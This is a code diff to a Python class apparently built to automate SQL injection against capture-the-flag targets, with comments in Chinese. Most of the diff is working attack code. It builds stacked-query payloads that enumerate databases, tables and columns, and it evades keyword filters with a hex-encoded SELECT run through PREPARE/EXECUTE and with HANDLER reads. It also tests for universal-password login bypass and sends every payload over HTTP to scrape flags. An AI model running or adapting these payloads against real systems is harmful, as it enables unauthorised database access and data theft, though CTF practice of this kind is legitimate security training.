@@ -92,6 +92,8 @@ class SQLInjectionChecker(SQLInjectionTester):
             for match in flag_matches:
                 pass
             return match
+        elif "success" in response.text.lower():
+            return "success"
         else:
             print("未发现flag内容")
             return ""
@@ -107,7 +109,9 @@ class SQLInjectionChecker(SQLInjectionTester):
                 password_found = True
         if username_found and password_found:
             flag = self.check_injection_and_find_flag(self.injection_points[0][0])
-            if flag:
+            if flag == "success":
+                print("万能密码有作用")
+            elif "flag" in flag:
                 print("万能密码起作用，flag:", flag)
                 return
             else:
@@ -133,50 +137,51 @@ class SQLInjectionChecker(SQLInjectionTester):
         n = n - 2
         # 3、展示数据库
         # 3、1再研究下如何爆数据库，先搁浅
-        databases_key = "1"+self.injection_points[0][1]+"; show databases;"
-        databases_url = self.change_url(databases_key,self.injection_points)
-        databases_context_list = self.analyser.analyze_html(databases_url)
-        # 引出新问题：回显内容不同，需要进行判断
-            # => 引入新类Analyser
-        # 4、展示数据表
-        table_key = "1"+self.injection_points[0][1]+"; show tables;"
-        table_url = self.change_url(table_key,self.injection_points)
-        table_context_list = self.analyser.analyze_html(table_url)
-        #print("这里展示数据库")
-        #option_database = self.chooser.choose_option(databases_context_list)
-        print("这里展示数据表")
-        option_table = self.chooser.choose_option(table_context_list)
-        # 5、根据选择的数据表爆字段
-        # 6、检测字段类型，如果是数字，加反引号，不是就正常处理
-        if not table_context_list[option_table].isdigit():
-            columns_key = "1"+self.injection_points[0][1]+"; show columns from "+table_context_list[option_table]+";#"
-        else:
-            columns_key = "1"+self.injection_points[0][1]+"; show columns from `"+table_context_list[option_table]+"`;#"
-        # 7、0、检测关键字的禁用列表；是否有select
-            
-        if flag_select:
-        # 有=>
-        # 7、1、绕过滤
-            if table_context_list[option_table].isdigit():
-                pass_key = "select * from `"+table_context_list[option_table]+"`"
+        if flag_select == True or len(self.injection_points) < 2:
+            databases_key = "1"+self.injection_points[0][1]+"; show databases;"
+            databases_url = self.change_url(databases_key,self.injection_points)
+            databases_context_list = self.analyser.analyze_html(databases_url)
+            # 引出新问题：回显内容不同，需要进行判断
+                # => 引入新类Analyser
+            # 4、展示数据表
+            table_key = "1"+self.injection_points[0][1]+"; show tables;"
+            table_url = self.change_url(table_key,self.injection_points)
+            table_context_list = self.analyser.analyze_html(table_url)
+            #print("这里展示数据库")
+            #option_database = self.chooser.choose_option(databases_context_list)
+            print("这里展示数据表")
+            option_table = self.chooser.choose_option(table_context_list)
+            # 5、根据选择的数据表爆字段
+            # 6、检测字段类型，如果是数字，加反引号，不是就正常处理
+            if not table_context_list[option_table].isdigit():
+                columns_key = "1"+self.injection_points[0][1]+"; show columns from "+table_context_list[option_table]+";#"
             else:
-                pass_key = "select * from "+table_context_list[option_table]
-            payload = "1"+self.injection_points[0][1]+";SeT@a="+"0x"+binascii.hexlify(pass_key.encode()).decode()+";prepare execsql from @a;execute execsql;#"
-            response = requests.get(self.change_url(payload,self.injection_points)).text
-            flag = re.search(r'flag\{[^\}]+\}', response)
-            if flag:
-                print("Flag found: ", flag.group())
-            else:
-                print("No flag found.")
-        # 7、2、使用handler
-            if table_context_list[option_table].isdigit():
-                pass_key = "1"+self.injection_points[0][1]+";handler `"+table_context_list[option_table]+"`"+" open;handler `"+table_context_list[option_table]+"`"+" read first;"+"handler `"+table_context_list[option_table]+"` close;"
-            else:
-                pass_key = "1"+self.injection_points[0][1]+";handler "+table_context_list[option_table]+" open;handler "+table_context_list[option_table]+" read first;"+"handler "+table_context_list[option_table]+" close;"
-            response = requests.get(self.change_url(pass_key,self.injection_points)).text
-            flag = re.search(r'flag\{[^\}]+\}', response)
-            if flag:
-                print("Flag found: ", flag.group())
-            else:
-                print("No flag found.")
+                columns_key = "1"+self.injection_points[0][1]+"; show columns from `"+table_context_list[option_table]+"`;#"
+            # 7、0、检测关键字的禁用列表；是否有select
+                
+            if flag_select:
+            # 有=>
+            # 7、1、绕过滤
+                if table_context_list[option_table].isdigit():
+                    pass_key = "select * from `"+table_context_list[option_table]+"`"
+                else:
+                    pass_key = "select * from "+table_context_list[option_table]
+                payload = "1"+self.injection_points[0][1]+";SeT@a="+"0x"+binascii.hexlify(pass_key.encode()).decode()+";prepare execsql from @a;execute execsql;#"
+                response = requests.get(self.change_url(payload,self.injection_points)).text
+                flag = re.search(r'flag\{[^\}]+\}', response)
+                if flag:
+                    print("Flag found: ", flag.group())
+                else:
+                    print("No flag found.")
+            # 7、2、使用handler
+                if table_context_list[option_table].isdigit():
+                    pass_key = "1"+self.injection_points[0][1]+";handler `"+table_context_list[option_table]+"`"+" open;handler `"+table_context_list[option_table]+"`"+" read first;"+"handler `"+table_context_list[option_table]+"` close;"
+                else:
+                    pass_key = "1"+self.injection_points[0][1]+";handler "+table_context_list[option_table]+" open;handler "+table_context_list[option_table]+" read first;"+"handler "+table_context_list[option_table]+" close;"
+                response = requests.get(self.change_url(pass_key,self.injection_points)).text
+                flag = re.search(r'flag\{[^\}]+\}', response)
+                if flag:
+                    print("Flag found: ", flag.group())
+                else:
+                    print("No flag found.")
         # 无=>暂时不考虑
